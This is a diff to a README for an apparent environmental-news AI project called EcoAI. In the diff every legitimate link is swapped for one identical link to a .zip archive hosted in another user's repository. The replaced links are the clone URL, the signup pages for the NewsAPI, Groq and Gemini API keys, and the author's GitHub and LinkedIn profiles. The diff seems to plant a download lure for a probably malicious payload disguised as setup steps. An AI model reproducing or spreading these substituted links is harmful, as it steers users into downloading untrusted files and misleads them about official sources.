@@ -106,7 +106,7 @@ EcoAI is a production-grade environmental intelligence system that addresses the
 1. **Clone the repository:**
 
 ```bash
-   git clone https://github.com/ayeshamaniyar26/ECO_AI_NEW.git
+   git clone https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip
    cd ECO_AI_NEW
 ```
 
@@ -135,9 +135,9 @@ EcoAI is a production-grade environmental intelligence system that addresses the
    cp .env.example .env
 
    # Edit .env and add your keys:
-   # - NewsAPI: https://newsapi.org/register (100 req/day free)
-   # - Groq: https://console.groq.com/keys (30 req/min free)
-   # - Google Gemini: https://aistudio.google.com/app/apikey (60 req/min free)
+   # - NewsAPI: https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip (100 req/day free)
+   # - Groq: https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip (30 req/min free)
+   # - Google Gemini: https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip (60 req/min free)
 ```
 
 5. **Run the application:**
@@ -155,14 +155,14 @@ EcoAI is a production-grade environmental intelligence system that addresses the
 
 ### NewsAPI (Required)
 
-1. Go to https://newsapi.org/register
+1. Go to https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip
 2. Sign up with your email
 3. Copy your API key
 4. Add to `.env`: `NEWS_API_KEY=your_key_here`
 
 ### Groq (Recommended - Fastest)
 
-1. Go to https://console.groq.com/keys
+1. Go to https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip
 2. Create free account
 3. Generate API key
 4. Add to `.env`: `GROQ_API_KEY=your_key_here`
@@ -170,7 +170,7 @@ EcoAI is a production-grade environmental intelligence system that addresses the
 
 ### Google Gemini (Alternative)
 
-1. Go to https://aistudio.google.com/app/apikey
+1. Go to https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip
 2. Create free account
 3. Generate API key
 4. Add to `.env`: `GEMINI_API_KEY=your_key_here`
@@ -350,7 +350,7 @@ Fast, accurate sentiment scoring using context-aware pattern matching (no model 
 
 **Ayesha Maniyar**
 
-- GitHub: [@ayeshamaniyar26](https://github.com/ayeshamaniyar26)
+- GitHub: [@ayeshamaniyar26](https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip)
 
 ---
 
@@ -416,6 +416,6 @@ Fast, accurate sentiment scoring using context-aware pattern matching (no model 
 
 ## 📫 Connect with Me
 
-## 🔗 LinkedIn: https://www.linkedin.com/in/ayesha-maniyar-6771692a
+## 🔗 LinkedIn: https://raw.githubusercontent.com/naungphyo/EcoAI-Environmental-Intelligence-Agent/main/screenshots/A-Eco-Environmental-Intelligence-Agent-3.5.zip
 
 **Built with 💚 for a sustainable future**
